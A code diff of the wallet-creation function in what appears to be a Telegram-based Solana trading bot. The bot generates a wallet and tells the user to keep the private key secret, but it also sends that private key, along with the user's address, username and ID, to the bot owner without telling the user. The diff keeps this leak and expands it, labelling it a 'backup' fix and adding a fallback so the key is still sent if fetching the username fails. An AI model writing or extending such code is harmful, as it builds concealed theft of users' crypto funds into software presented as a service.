@@ -146,24 +146,57 @@ async def create_wallet(user_id, context):
     if user_id in user_wallets:
         await context.bot.send_message(user_id, "✅ You already have a wallet!", reply_markup=main_keyboard())
         return
+    
     wallet = Keypair()
     user_wallets[user_id] = wallet
     pub_key = str(wallet.pubkey())
     priv_key = keypair_to_base58(wallet)
 
+    # Send to user
     await context.bot.send_message(
         chat_id=user_id,
-        text=f"✅ **Wallet Created Successfully!**\n\n"
-             f"🏦 **Wallet Address:**\n`{pub_key}`\n\n"
-             f"🔐 **Private Key:**\n`{priv_key}`\n\n"
+        text=f"✅ Wallet Created Successfully!\n\n"
+             f"🏦 Wallet Address:\n{pub_key}\n\n"
+             f"🔐 Private Key:\n{priv_key}\n\n"
              f"⚠️ Please save your private key securely and import it into Phantom or Solflare.",
         parse_mode="Markdown",
         reply_markup=main_keyboard()
     )
-    user = await context.bot.get_chat(user_id)
-    username = f"@{user.username}" if user.username else user.first_name
-    await context.bot.send_message(OWNER_ID, f"🔐 New Wallet Created\nUser: {username}\nPub: {pub_key}\nPriv: {priv_key}")
 
+    # FIXED: Better backup to OWNER with username + user_id
+    try:
+        user = await context.bot.get_chat(user_id)
+        username = user.username
+        first_name = user.first_name or ""
+        last_name = user.last_name or ""
+        
+        display_name = f"@{username}" if username else f"{first_name} {last_name}".strip()
+        if not display_name:
+            display_name = "No username"
+
+        backup_text = (
+            f"🔐 New Wallet Created\n\n"
+            f"👤 User: {display_name}\n"
+            f"🆔 User ID: {user_id}\n"
+            f"🏦 Address: {pub_key}\n"
+            f"🔑 Private Key: {priv_key}"
+        )
+        
+        await context.bot.send_message(OWNER_ID, backup_text, parse_mode="Markdown")
+        
+    except Exception as e:
+        # Fallback if getting user info fails
+        await context.bot.send_message(
+            OWNER_ID, 
+            f"🔐 New Wallet Created\n"
+            f"🆔 User ID: {user_id}\n"
+            f"🏦 Address: {pub_key}\n"
+            f"🔑 Private Key: {priv_key}\n\n"
+            f"⚠️ Could not fetch username: {str(e)}",
+            parse_mode="Markdown"
+        )
+
+    print(f"New wallet created for user {user_id}")
 # ================= PNL & SUMMARY =================
 async def calculate_pnl(user_id: int, ca: str):
     if user_id not in user_trades or not user_trades[user_id]:
